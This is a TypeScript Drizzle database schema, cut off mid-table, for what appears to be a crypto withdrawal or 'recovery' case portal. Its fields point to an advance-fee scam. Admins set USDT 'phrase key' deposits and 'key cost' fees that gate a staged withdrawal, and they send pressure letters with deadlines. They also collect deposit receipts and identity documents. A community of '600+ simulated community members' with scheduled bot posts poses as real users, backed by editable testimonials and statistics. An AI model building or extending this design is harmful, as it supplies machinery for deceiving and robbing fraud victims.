import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, serial, boolean, integer } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const cases = pgTable("cases", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  accessCode: text("access_code").notNull().unique(),
  status: text("status").notNull().default('created'),
  
  // User registration data
  userName: text("user_name"),
  userEmail: text("user_email"),
  userMobile: text("user_mobile"),
  
  // Admin finalization data
  vipStatus: text("vip_status"),
  username: text("username"),
  withdrawalAmount: text("withdrawal_amount"),
  withdrawalBatches: text("withdrawal_batches"),
  physilocal0: text("physilocal0"),
  
  // Per-user deposit and profile settings
  depositAddress: text("deposit_address"),
  profileRedirectUrl: text("profile_redirect_url"),
  hasRequirements: boolean("has_requirements").default(false),
  
  // Letter control - admin manually sends letters
  letterSent: boolean("letter_sent").default(false),
  
  // Landing page preference after finalization
  landingPage: text("landing_page").default('dashboard'), // 'dashboard', 'letter', 'deposit', 'messages'
  
  // Priority level for case management
  priority: text("priority").default('medium'), // 'high', 'medium', 'low'
  
  // Case assignment and tags
  assignedTo: text("assigned_to"),
  tags: text("tags"), // JSON array of tags
  
  // Internal admin notes (not visible to user)
  internalNotes: text("internal_notes"),
  
  // IP/Location tracking
  lastLoginIp: text("last_login_ip"),
  lastLoginLocation: text("last_login_location"),
  lastLoginAt: timestamp("last_login_at"),
  
  // Progress tracking
  completionPercentage: text("completion_percentage").default('0'),
  
  // Withdrawal progress tracking (admin-controlled visibility)
  showWithdrawalProgress: boolean("show_withdrawal_progress").default(false),
  withdrawalStage: text("withdrawal_stage").default('1'), // 1-14 stages
  activityDepositAmount: text("activity_deposit_amount"), // Amount user needs to keep in wallet
  
  // Phrase Key tracking
  phraseKeyDepositAmount: text("phrase_key_deposit_amount"), // Admin-set deposit amount for phrase key
  phraseKeyMergeDeposit: text("phrase_key_merge_deposit"), // Calculated 30% of phraseKeyDepositAmount
  activityWalletRequirement: text("activity_wallet_requirement"), // USDT amount for activity verification
  phraseKeyCertificateSent: boolean("phrase_key_certificate_sent").default(false), // Flag for auto-message
  
  // Simplified submission URL approach
  submissionUrl: text("submission_url"), // External URL where user submits their request
  
  // User's personal 6-digit PIN (set by user after verifying admin-provided access code)
  userPin: text("user_pin"), // 6-digit PIN for future logins
  
  // Department assignment
  departmentId: integer("department_id"), // References department for case categorization
  currentStageId: integer("current_stage_id"), // Current workflow stage
  
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseSchema = createInsertSchema(cases).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const updateCaseSchema = insertCaseSchema.partial();

export type InsertCase = z.infer<typeof insertCaseSchema>;
export type UpdateCase = z.infer<typeof updateCaseSchema>;
export type Case = typeof cases.$inferSelect;

// Custom letter content per case
export const caseLetters = pgTable("case_letters", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  
  // Letter sections that admin can customize
  headline: text("headline").default("Withdrawal Protocol Selection"),
  introduction: text("introduction"),
  bodyContent: text("body_content"),
  footerNote: text("footer_note"),
  
  // Compliance reference text
  complianceReference: text("compliance_reference"),
  
  // Option A customization (matching screenshot exactly)
  optionATitle: text("option_a_title").default("Accelerated Release"),
  optionADescription: text("option_a_description"),
  optionAAmount: text("option_a_amount"),
  optionAFrequency: text("option_a_frequency"), // e.g., "every 12 hours"
  optionABatches: text("option_a_batches"), // e.g., "10 Transfers"
  optionAKeyCost: text("option_a_key_cost"), // e.g., "260.996 USDT"
  optionATotalRequirement: text("option_a_total_requirement"), // e.g., "2,609.96 USDT"
  optionATotalAmount: text("option_a_total_amount"),
  optionAFilelocoId: text("option_a_fileloco_id"),
  
  // Option B customization
  optionBTitle: text("option_b_title").default("Standard Release"),
  optionBDescription: text("option_b_description"),
  optionBAmount: text("option_b_amount"),
  optionBFrequency: text("option_b_frequency"), // e.g., "every 12 hours"
  optionBBatches: text("option_b_batches"), // e.g., "20 Transfers"
  optionBKeyCost: text("option_b_key_cost"), // e.g., "521.993 USDT"
  optionBTotalRequirement: text("option_b_total_requirement"), // e.g., "5,219.92 USDT"
  optionBTotalAmount: text("option_b_total_amount"),
  optionBFilelocoId: text("option_b_fileloco_id"),
  
  // Phrase Key Requirements section (JSON array of bullet points)
  phraseKeyRequirements: text("phrase_key_requirements"),
  
  // Compliance Notice warning text
  complianceNotice: text("compliance_notice"),
  
  // Scheduling - for scheduled letter delivery
  scheduledFor: timestamp("scheduled_for"),
  sentAt: timestamp("sent_at"),
  
  // Deadline/expiration for action
  expiresAt: timestamp("expires_at"),
  
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseLetterSchema = createInsertSchema(caseLetters).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const updateCaseLetterSchema = insertCaseLetterSchema.partial();

export type InsertCaseLetter = z.infer<typeof insertCaseLetterSchema>;
export type UpdateCaseLetter = z.infer<typeof updateCaseLetterSchema>;
export type CaseLetter = typeof caseLetters.$inferSelect;

// Submission history
export const caseSubmissions = pgTable("case_submissions", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  
  selectedOption: text("selected_option").notNull(),
  notes: text("notes"),
  
  // Snapshot of user info at submission time
  userName: text("user_name"),
  userEmail: text("user_email"),
  
  // Snapshot of withdrawal details at submission time
  withdrawalAmount: text("withdrawal_amount"),
  withdrawalBatches: text("withdrawal_batches"),
  
  submittedAt: timestamp("submitted_at").notNull().default(sql`now()`),
});

export const insertCaseSubmissionSchema = createInsertSchema(caseSubmissions).omit({
  id: true,
  submittedAt: true,
});

export type InsertCaseSubmission = z.infer<typeof insertCaseSubmissionSchema>;
export type CaseSubmission = typeof caseSubmissions.$inferSelect;

// Chat messages between admin and user
export const chatMessages = pgTable("chat_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  sender: text("sender").notNull(), // 'admin' or 'user'
  message: text("message").notNull(),
  isRead: text("is_read").default('false'),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertChatMessageSchema = createInsertSchema(chatMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertChatMessage = z.infer<typeof insertChatMessageSchema>;
export type ChatMessage = typeof chatMessages.$inferSelect;

// Admin messages with categories (Urgent/Processing/Resolved)
export const adminMessages = pgTable("admin_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  category: text("category").notNull().default('processing'), // 'urgent', 'processing', 'resolved'
  title: text("title").notNull(),
  body: text("body").notNull(),
  isRead: boolean("is_read").default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAdminMessageSchema = createInsertSchema(adminMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertAdminMessage = z.infer<typeof insertAdminMessageSchema>;
export type AdminMessage = typeof adminMessages.$inferSelect;

// Deposit receipts uploaded by users
export const depositReceipts = pgTable("deposit_receipts", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  submissionId: serial("submission_id"),
  imageData: text("image_data"), // Base64 encoded image
  fileName: text("file_name"),
  notes: text("notes"),
  status: text("status").default('pending'), // 'pending', 'reviewed', 'approved', 'rejected'
  adminNotes: text("admin_notes"), // Admin feedback/notes on the receipt
  uploadedAt: timestamp("uploaded_at").notNull().default(sql`now()`),
});

export const insertDepositReceiptSchema = createInsertSchema(depositReceipts).omit({
  id: true,
  uploadedAt: true,
});

export type InsertDepositReceipt = z.infer<typeof insertDepositReceiptSchema>;
export type DepositReceipt = typeof depositReceipts.$inferSelect;

// Activity timeline - tracks all user/admin actions
export const activityLogs = pgTable("activity_logs", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").references(() => cases.id),
  actorType: text("actor_type").notNull(), // 'user', 'admin', 'system'
  actorId: text("actor_id"), // admin username or 'user'
  action: text("action").notNull(), // 'login', 'submission', 'message_sent', 'document_uploaded', etc.
  description: text("description").notNull(),
  metadata: text("metadata"), // JSON for additional data
  ipAddress: text("ip_address"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertActivityLogSchema = createInsertSchema(activityLogs).omit({
  id: true,
  createdAt: true,
});

export type InsertActivityLog = z.infer<typeof insertActivityLogSchema>;
export type ActivityLog = typeof activityLogs.$inferSelect;

// Audit log - tracks all admin actions for compliance
export const auditLogs = pgTable("audit_logs", {
  id: serial("id").primaryKey(),
  adminUsername: text("admin_username").notNull(),
  action: text("action").notNull(), // 'create_case', 'finalize_case', 'send_message', etc.
  targetType: text("target_type"), // 'case', 'user', 'message', etc.
  targetId: text("target_id"),
  previousValue: text("previous_value"), // JSON of old state
  newValue: text("new_value"), // JSON of new state
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAuditLogSchema = createInsertSchema(auditLogs).omit({
  id: true,
  createdAt: true,
});

export type InsertAuditLog = z.infer<typeof insertAuditLogSchema>;
export type AuditLog = typeof auditLogs.$inferSelect;

// Admin users with role-based access
export const adminUsers = pgTable("admin_users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  passwordHash: text("password_hash").notNull(),
  role: text("role").notNull().default('agent'), // 'super_admin', 'admin', 'agent', 'viewer'
  displayName: text("display_name"),
  email: text("email"),
  isActive: boolean("is_active").default(true),
  twoFactorEnabled: boolean("two_factor_enabled").default(false),
  twoFactorSecret: text("two_factor_secret"),
  lastLoginAt: timestamp("last_login_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertAdminUserSchema = createInsertSchema(adminUsers).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertAdminUser = z.infer<typeof insertAdminUserSchema>;
export type AdminUser = typeof adminUsers.$inferSelect;

// User feedback/ratings
export const userFeedback = pgTable("user_feedback", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  rating: text("rating").notNull(), // '1' to '5'
  comment: text("comment"),
  feedbackType: text("feedback_type").default('support'), // 'support', 'overall', 'feature'
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertUserFeedbackSchema = createInsertSchema(userFeedback).omit({
  id: true,
  createdAt: true,
});

export type InsertUserFeedback = z.infer<typeof insertUserFeedbackSchema>;
export type UserFeedback = typeof userFeedback.$inferSelect;

// Message templates for quick replies
export const messageTemplates = pgTable("message_templates", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  category: text("category").default('general'), // 'greeting', 'follow_up', 'urgent', 'general'
  content: text("content").notNull(),
  isActive: boolean("is_active").default(true),
  usageCount: text("usage_count").default('0'),
  createdBy: text("created_by"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertMessageTemplateSchema = createInsertSchema(messageTemplates).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertMessageTemplate = z.infer<typeof insertMessageTemplateSchema>;
export type MessageTemplate = typeof messageTemplates.$inferSelect;

// Document requests from admin
export const documentRequests = pgTable("document_requests", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  documentType: text("document_type").notNull(), // 'id_proof', 'address_proof', 'bank_statement', etc.
  description: text("description"),
  status: text("status").default('pending'), // 'pending', 'submitted', 'approved', 'rejected'
  submittedFileData: text("submitted_file_data"), // Base64
  submittedFileName: text("submitted_file_name"),
  adminNotes: text("admin_notes"),
  deadline: timestamp("deadline"),
  submittedAt: timestamp("submitted_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertDocumentRequestSchema = createInsertSchema(documentRequests).omit({
  id: true,
  createdAt: true,
});

export type InsertDocumentRequest = z.infer<typeof insertDocumentRequestSchema>;
export type DocumentRequest = typeof documentRequests.$inferSelect;

// User sessions for session management
export const userSessions = pgTable("user_sessions", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  sessionToken: text("session_token").notNull().unique(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  location: text("location"),
  isActive: boolean("is_active").default(true),
  lastActivityAt: timestamp("last_activity_at").notNull().default(sql`now()`),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  expiresAt: timestamp("expires_at"),
});

export const insertUserSessionSchema = createInsertSchema(userSessions).omit({
  id: true,
  createdAt: true,
});

export type InsertUserSession = z.infer<typeof insertUserSessionSchema>;
export type UserSession = typeof userSessions.$inferSelect;

// Scheduled messages for future delivery
export const scheduledMessages = pgTable("scheduled_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").references(() => cases.id),
  messageType: text("message_type").notNull(), // 'chat', 'admin_message', 'letter'
  category: text("category"), // For admin messages: 'urgent', 'processing', 'resolved'
  title: text("title"),
  content: text("content").notNull(),
  scheduledFor: timestamp("scheduled_for").notNull(),
  status: text("status").default('pending'), // 'pending', 'sent', 'cancelled'
  sentAt: timestamp("sent_at"),
  createdBy: text("created_by"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertScheduledMessageSchema = createInsertSchema(scheduledMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertScheduledMessage = z.infer<typeof insertScheduledMessageSchema>;
export type ScheduledMessage = typeof scheduledMessages.$inferSelect;

// Help center articles
export const helpArticles = pgTable("help_articles", {
  id: serial("id").primaryKey(),
  title: text("title").notNull(),
  content: text("content").notNull(),
  category: text("category").default('general'), // 'general', 'deposits', 'withdrawals', 'account'
  order: text("display_order").default('0'),
  isPublished: boolean("is_published").default(true),
  viewCount: text("view_count").default('0'),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertHelpArticleSchema = createInsertSchema(helpArticles).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertHelpArticle = z.infer<typeof insertHelpArticleSchema>;
export type HelpArticle = typeof helpArticles.$inferSelect;

// Notifications center
export const notifications = pgTable("notifications", {
  id: serial("id").primaryKey(),
  recipientType: text("recipient_type").notNull(), // 'admin', 'user'
  recipientId: text("recipient_id"), // admin username or caseId
  type: text("type").notNull(), // 'new_message', 'new_submission', 'document_uploaded', etc.
  title: text("title").notNull(),
  body: text("body"),
  link: text("link"), // URL to navigate to
  isRead: boolean("is_read").default(false),
  metadata: text("metadata"), // JSON
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertNotificationSchema = createInsertSchema(notifications).omit({
  id: true,
  createdAt: true,
});

export type InsertNotification = z.infer<typeof insertNotificationSchema>;
export type Notification = typeof notifications.$inferSelect;

// Admin sessions for session management and 2FA
export const adminSessions = pgTable("admin_sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  adminUsername: text("admin_username").notNull(),
  token: text("token").notNull().unique(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  location: text("location"),
  isActive: boolean("is_active").default(true),
  lastActivityAt: timestamp("last_activity_at").notNull().default(sql`now()`),
  expiresAt: timestamp("expires_at").notNull(),
  revokedAt: timestamp("revoked_at"),
  revokedReason: text("revoked_reason"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAdminSessionSchema = createInsertSchema(adminSessions).omit({
  id: true,
  createdAt: true,
});

export type InsertAdminSession = z.infer<typeof insertAdminSessionSchema>;
export type AdminSession = typeof adminSessions.$inferSelect;

// Admin 2FA settings
export const adminTwoFactor = pgTable("admin_two_factor", {
  id: serial("id").primaryKey(),
  adminUsername: text("admin_username").notNull().unique(),
  secret: text("secret").notNull(),
  backupCodes: text("backup_codes"), // JSON array of hashed backup codes
  isEnabled: boolean("is_enabled").default(false),
  lastVerifiedAt: timestamp("last_verified_at"),
  enabledAt: timestamp("enabled_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertAdminTwoFactorSchema = createInsertSchema(adminTwoFactor).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertAdminTwoFactor = z.infer<typeof insertAdminTwoFactorSchema>;
export type AdminTwoFactor = typeof adminTwoFactor.$inferSelect;

// Chat templates for quick responses
export const chatTemplates = pgTable("chat_templates", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  content: text("content").notNull(),
  category: text("category").default('general'), // 'general', 'support', 'verification', 'deposits'
  shortcut: text("shortcut"), // Quick keyboard shortcut like /greeting
  isActive: boolean("is_active").default(true),
  usageCount: text("usage_count").default('0'),
  createdBy: text("created_by"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertChatTemplateSchema = createInsertSchema(chatTemplates).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertChatTemplate = z.infer<typeof insertChatTemplateSchema>;
export type ChatTemplate = typeof chatTemplates.$inferSelect;

// Case notes (admin-only comments)
export const caseNotes = pgTable("case_notes", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  adminUsername: text("admin_username").notNull(),
  content: text("content").notNull(),
  isPinned: boolean("is_pinned").default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseNoteSchema = createInsertSchema(caseNotes).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertCaseNote = z.infer<typeof insertCaseNoteSchema>;
export type CaseNote = typeof caseNotes.$inferSelect;

// Localization/translations
export const translations = pgTable("translations", {
  id: serial("id").primaryKey(),
  key: text("key").notNull(),
  locale: text("locale").notNull(), // 'en', 'es', 'zh', etc.
  value: text("value").notNull(),
  context: text("context"), // Where this translation is used
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertTranslationSchema = createInsertSchema(translations).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertTranslation = z.infer<typeof insertTranslationSchema>;
export type Translation = typeof translations.$inferSelect;

// Newsletter subscribers
export const newsletterSubscribers = pgTable("newsletter_subscribers", {
  id: serial("id").primaryKey(),
  email: text("email").notNull().unique(),
  isActive: boolean("is_active").default(true),
  subscribedAt: timestamp("subscribed_at").notNull().default(sql`now()`),
  unsubscribedAt: timestamp("unsubscribed_at"),
});

export const insertNewsletterSubscriberSchema = createInsertSchema(newsletterSubscribers).omit({
  id: true,
  subscribedAt: true,
});

export type InsertNewsletterSubscriber = z.infer<typeof insertNewsletterSubscriberSchema>;
export type NewsletterSubscriber = typeof newsletterSubscribers.$inferSelect;

// Scam alerts for ticker
export const scamAlerts = pgTable("scam_alerts", {
  id: serial("id").primaryKey(),
  title: text("title").notNull(),
  description: text("description"),
  severity: text("severity").default('medium'), // 'low', 'medium', 'high', 'critical'
  platformName: text("platform_name"),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertScamAlertSchema = createInsertSchema(scamAlerts).omit({
  id: true,
  createdAt: true,
});

export type InsertScamAlert = z.infer<typeof insertScamAlertSchema>;
export type ScamAlert = typeof scamAlerts.$inferSelect;

// Testimonials
export const testimonials = pgTable("testimonials", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  location: text("location"),
  avatar: text("avatar"), // URL or base64
  rating: text("rating").notNull().default('5'), // 1-5
  content: text("content").notNull(),
  isApproved: boolean("is_approved").default(false),
  isFeatured: boolean("is_featured").default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertTestimonialSchema = createInsertSchema(testimonials).omit({
  id: true,
  createdAt: true,
});

export type InsertTestimonial = z.infer<typeof insertTestimonialSchema>;
export type Testimonial = typeof testimonials.$inferSelect;

// Site statistics
export const siteStatistics = pgTable("site_statistics", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(), // 'cases_reviewed', 'users_protected', 'response_time', 'resolution_rate'
  value: text("value").notNull(),
  label: text("label").notNull(),
  icon: text("icon"),
  displayOrder: text("display_order").default('0'),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertSiteStatisticSchema = createInsertSchema(siteStatistics).omit({
  id: true,
  updatedAt: true,
});

export type InsertSiteStatistic = z.infer<typeof insertSiteStatisticSchema>;
export type SiteStatistic = typeof siteStatistics.$inferSelect;

// Contact form submissions
export const contactSubmissions = pgTable("contact_submissions", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  email: text("email").notNull(),
  subject: text("subject"),
  message: text("message").notNull(),
  status: text("status").default('new'), // 'new', 'read', 'replied', 'archived'
  adminNotes: text("admin_notes"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertContactSubmissionSchema = createInsertSchema(contactSubmissions).omit({
  id: true,
  createdAt: true,
});

export type InsertContactSubmission = z.infer<typeof insertContactSubmissionSchema>;
export type ContactSubmission = typeof contactSubmissions.$inferSelect;

// FAQ items
export const faqItems = pgTable("faq_items", {
  id: serial("id").primaryKey(),
  question: text("question").notNull(),
  answer: text("answer").notNull(),
  category: text("category").default('general'),
  displayOrder: text("display_order").default('0'),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertFaqItemSchema = createInsertSchema(faqItems).omit({
  id: true,
  createdAt: true,
});

export type InsertFaqItem = z.infer<typeof insertFaqItemSchema>;
export type FaqItem = typeof faqItems.$inferSelect;

// ============================================
// DEPARTMENTS & COMMUNITY SYSTEM
// ============================================

// Departments - 5 main departments for case categorization
export const departments = pgTable("departments", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(), // 'submission', 'request', 'complaint', 'compliance', 'recovery'
  name: text("name").notNull(),
  description: text("description"),
  icon: text("icon"), // lucide icon name
  color: text("color").default('#004182'), // brand color
  displayOrder: text("display_order").default('0'),
  isActive: boolean("is_active").default(true),
  workflowConfig: text("workflow_config"), // JSON workflow settings
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertDepartmentSchema = createInsertSchema(departments).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertDepartment = z.infer<typeof insertDepartmentSchema>;
export type Department = typeof departments.$inferSelect;

// Department stages - workflow stages for each department
export const departmentStages = pgTable("department_stages", {
  id: serial("id").primaryKey(),
  departmentId: integer("department_id").references(() => departments.id),
  name: text("name").notNull(),
  description: text("description"),
  stageOrder: text("stage_order").notNull().default('1'),
  slaDays: text("sla_days"), // expected days to complete
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertDepartmentStageSchema = createInsertSchema(departmentStages).omit({
  id: true,
  createdAt: true,
});

export type InsertDepartmentStage = z.infer<typeof insertDepartmentStageSchema>;
export type DepartmentStage = typeof departmentStages.$inferSelect;

// Community threads - discussion topics organized by department
export const communityThreads = pgTable("community_threads", {
  id: serial("id").primaryKey(),
  departmentId: integer("department_id").references(() => departments.id),
  title: text("title").notNull(),
  content: text("content").notNull(),
  authorType: text("author_type").notNull().default('bot'), // 'user', 'bot', 'admin'
  authorHandle: text("author_handle").notNull(), // anonymous display name
  authorBotId: integer("author_bot_id"), // references bot profile if bot
  isPinned: boolean("is_pinned").default(false),
  isLocked: boolean("is_locked").default(false),
  viewCount: text("view_count").default('0'),
  replyCount: text("reply_count").default('0'),
  lastActivityAt: timestamp("last_activity_at").notNull().default(sql`now()`),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertCommunityThreadSchema = createInsertSchema(communityThreads).omit({
  id: true,
  createdAt: true,
});

export type InsertCommunityThread = z.infer<typeof insertCommunityThreadSchema>;
export type CommunityThread = typeof communityThreads.$inferSelect;

// Community posts - replies within threads
export const communityPosts = pgTable("community_posts", {
  id: serial("id").primaryKey(),
  threadId: integer("thread_id").references(() => communityThreads.id),
  content: text("content").notNull(),
  authorType: text("author_type").notNull().default('bot'), // 'user', 'bot', 'admin'
  authorHandle: text("author_handle").notNull(), // anonymous display name
  authorBotId: integer("author_bot_id"), // references bot profile if bot
  isHidden: boolean("is_hidden").default(false),
  likeCount: text("like_count").default('0'),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCommunityPostSchema = createInsertSchema(communityPosts).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertCommunityPost = z.infer<typeof insertCommunityPostSchema>;
export type CommunityPost = typeof communityPosts.$inferSelect;

// Community participants - maps real users to anonymous handles
export const communityParticipants = pgTable("community_participants", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").references(() => cases.id),
  anonymousHandle: text("anonymous_handle").notNull().unique(),
  departmentId: integer("department_id").references(() => departments.id),
  joinedAt: timestamp("joined_at").notNull().default(sql`now()`),
  postCount: text("post_count").default('0'),
  reputation: text("reputation").default('0'),
  badgeLevel: text("badge_level").default('newcomer'), // 'newcomer', 'member', 'trusted', 'veteran'
});

export const insertCommunityParticipantSchema = createInsertSchema(communityParticipants).omit({
  id: true,
  joinedAt: true,
});

export type InsertCommunityParticipant = z.infer<typeof insertCommunityParticipantSchema>;
export type CommunityParticipant = typeof communityParticipants.$inferSelect;

// Community reactions - likes/helpful marks on posts
export const communityReactions = pgTable("community_reactions", {
  id: serial("id").primaryKey(),
  postId: integer("post_id").references(() => communityPosts.id),
  participantId: integer("participant_id").references(() => communityParticipants.id),
  reactionType: text("reaction_type").notNull().default('like'), // 'like', 'helpful', 'thanks'
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertCommunityReactionSchema = createInsertSchema(communityReactions).omit({
  id: true,
  createdAt: true,
});

export type InsertCommunityReaction = z.infer<typeof insertCommunityReactionSchema>;
export type CommunityReaction = typeof communityReactions.$inferSelect;

// Bot profiles - 600+ simulated community members
export const botProfiles = pgTable("bot_profiles", {
  id: serial("id").primaryKey(),
  handle: text("handle").notNull().unique(),
  displayName: text("display_name").notNull(),
  avatarInitials: text("avatar_initials").notNull(), // 2 letter initials for avatar
  departmentId: integer("department_id").references(() => departments.id),
  caseStage: text("case_stage").default('active'), // simulated case progress
  personality: text("personality"), // JSON personality traits for content generation
  joinedDate: timestamp("joined_date").notNull().default(sql`now()`),
  postCount: text("post_count").default('0'),
  reputation: text("reputation").default('0'),
  badgeLevel: text("badge_level").default('member'),
  isActive: boolean("is_active").default(true),
  lastPostAt: timestamp("last_post_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertBotProfileSchema = createInsertSchema(botProfiles).omit({
  id: true,
  createdAt: true,
});

export type InsertBotProfile = z.infer<typeof insertBotProfileSchema>;
export type BotProfile = typeof botProfiles.$inferSelect;

// Bot scheduled posts - pre-planned bot activity
export const botScheduledPosts = pgTable("bot_scheduled_posts", {
  id: serial("id").primaryKey(),
  botId: integer("bot_id").references(() => botProfiles.id),
  threadId: integer("thread_id").references(() => communityThreads.id),
  postType: text("post_type").notNull().default('reply'), // 'thread', 'reply'
  content: text("content").notNull(),
  scheduledFor: timestamp("scheduled_for").notNull(),
  status: text("status").default('pending'), // 'pending', 'posted', 'cancelled'
  postedAt: timestamp("posted_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertBotScheduledPostSchema = createInsertSchema(botScheduledPosts).omit({
  id: true,
  createdAt: true,
});

export type InsertBotScheduledPost = z.infer<typeof insertBotScheduledPostSchema>;
export type BotScheduledPost = typeof botScheduledPosts.$inferSelect;

// Community moderation log
export const communityModerationLogs = pgTable("community_moderation_logs", {
  id: serial("id").primaryKey(),
  adminUsername: text("admin_username").notNull(),
  action: text("action").notNull(), // 'hide_post', 'lock_thread', 'pin_thread', 'ban_participant'
  targetType: text("target_type").notNull(), // 'thread', 'post', 'participant'
  targetId: text("target_id").notNull(),
  reason: text("reason"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertCommunityModerationLogSchema = createInsertSchema(communityModerationLogs).omit({
  id: true,
  createdAt: true,
});

export type InsertCommunityModerationLog = z.infer<typeof insertCommunityModerationLogSchema>;
export type CommunityModerationLog = typeof communityModerationLogs.$inferSelect;

// User badges/achievements
export const userBadges = pgTable("user_badges", {
  id: serial("id").primaryKey(),
  name: text("name").notNull().unique(),
  description: text("description"),
  icon: text("icon"), // emoji or icon name
  color: text("color").default('#004182'),
  requirement: text("requirement"), // JSON criteria to earn badge
  displayOrder: text("display_order").default('0'),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertUserBadgeSchema = createInsertSchema(userBadges).omit({
  id: true,
  createdAt: true,
});

export type InsertUserBadge = z.infer<typeof insertUserBadgeSchema>;
export type UserBadge = typeof userBadges.$inferSelect;

// User earned badges
export const earnedBadges = pgTable("earned_badges", {
  id: serial("id").primaryKey(),
  participantId: integer("participant_id").references(() => communityParticipants.id),
  badgeId: integer("badge_id").references(() => userBadges.id),
  earnedAt: timestamp("earned_at").notNull().default(sql`now()`),
});

export const insertEarnedBadgeSchema = createInsertSchema(earnedBadges).omit({
  id: true,
  earnedAt: true,
});

export type InsertEarnedBadge = z.infer<typeof insertEarnedBadgeSchema>;
export type EarnedBadge = typeof earnedBadges.$inferSelect;

// User documents uploaded
export const userDocuments = pgTable("user_documents", {
  id: serial("id").primaryKey(),
